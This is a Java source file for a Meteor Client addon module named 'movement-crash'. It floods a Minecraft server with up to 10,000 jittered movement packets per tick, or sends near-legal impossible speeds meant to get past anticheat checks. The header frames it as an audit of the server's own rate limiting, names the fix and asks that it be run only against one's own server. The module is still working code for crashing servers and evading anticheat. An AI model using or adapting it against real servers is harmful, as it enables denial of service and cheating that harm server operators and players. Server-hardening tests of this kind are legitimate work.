package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.DoubleSetting;
import meteordevelopment.meteorclient.settings.EnumSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

/**
 * AUDIT: Movement Crash (rate flood + subtle physically-impossible motion)
 *
 * Two modes:
 *
 *   FLOOD — full position+rotation packets at up to 10,000/tick with jitter.
 *     Tests the raw inbound movement rate limiter: does the server process ALL
 *     N packets (validate, AC-check, update tracking) or limit before the work?
 *
 *   SUBTLE — the depth case (review criterion 1): a SMALL number of packets per
 *     tick describing motion that is almost legal but physically impossible —
 *     e.g. a steady 2.9 blocks/tick walk (above legal speed, below the coarse
 *     teleport threshold), or micro-steps that each look fine but sum to an
 *     impossible velocity. This is what a careful cheater actually sends; it
 *     probes whether the AC checks inter-tick continuity, not just gross bounds.
 *
 * Vulnerable server: processes every packet (FLOOD) / accepts sub-threshold
 * illegal deltas (SUBTLE). Hardened server: one authoritative update per tick,
 * and a per-tick delta cap derived from real movement physics.
 * Fix: accept at most one movement update/tick at the Netty stage; validate the
 * delta against physics (speed, acceleration, continuity), not just a hard cap.
 *
 * Run against your OWN local server only.
 */
public class MovementCrash extends Module {
    public enum Mode { FLOOD, SUBTLE }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("FLOOD = high-rate jitter (rate-limiter test); SUBTLE = a few packets/tick of almost-legal impossible motion (continuity test).")
        .defaultValue(Mode.FLOOD).build()
    );
    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets").description("Packets per tick (FLOOD).")
        .defaultValue(2000).min(1).sliderMax(10000)
        .visible(() -> mode.get() == Mode.FLOOD).build()
    );
    private final Setting<Double> subtleSpeed = sgGeneral.add(new DoubleSetting.Builder()
        .name("subtle-blocks-per-tick")
        .description("Horizontal blocks/tick claimed in SUBTLE mode. ~2.9 is above legal walk yet below coarse teleport caps.")
        .defaultValue(2.9).range(0.3, 9.9).sliderRange(0.3, 9.9)
        .visible(() -> mode.get() == Mode.SUBTLE).build()
    );
    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
        .name("ramp-mode")
        .description("Auto-increment rate each tick to find the server's threshold (FLOOD).")
        .defaultValue(false).visible(() -> mode.get() == Mode.FLOOD).build()
    );
    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
        .name("ramp-step").description("Rate increase per tick in ramp mode.")
        .defaultValue(10).range(1, 500).sliderRange(1, 100)
        .visible(() -> mode.get() == Mode.FLOOD && rampMode.get()).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoMonitor = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-monitor")
        .description("Auto-enable Server Health Monitor to track TPS impact while this module runs.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int currentRate = 1;
    private double subtleX, subtleZ;
    private boolean subtleInit;

    private final Random random = new Random();

    public MovementCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "movement-crash",
            "Floods jittered moves OR walks an almost-legal impossible speed. Tests rate limiting and inter-tick continuity.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; currentRate = 1; subtleInit = false;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
        if (autoMonitor.get()) {
            var shm = Modules.get().get(ServerHealthMonitor.class);
            if (shm != null && !shm.isActive()) shm.toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;

        if (mode.get() == Mode.SUBTLE) fireSubtle();
        else fireFlood();

        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    private void fireFlood() {
        int rate = rampMode.get() ? currentRate : packets.get();
        if (rampMode.get()) currentRate += rampStep.get();
        Vec3d pos = mc.player.getEntityPos();
        for (int i = 0; i < rate; i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(
                pos.x + jitter(1), pos.y + jitter(1), pos.z + jitter(1),
                (float) (random.nextDouble() * 90), (float) (random.nextDouble() * 180),
                true, false));
            packetsSent++;
        }
    }

    private void fireSubtle() {
        if (!subtleInit) { subtleX = mc.player.getX(); subtleZ = mc.player.getZ(); subtleInit = true; }
        // Each tick advance by an almost-legal-but-impossible horizontal step, on the ground.
        subtleX += subtleSpeed.get();
        double y = mc.player.getY();
        mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
            subtleX, y, subtleZ, true, false));
        packetsSent++;
    }

    private double jitter(double rad) {
        return random.nextDouble() * rad - (rad / 2);
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            if (mode.get() == Mode.FLOOD && rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
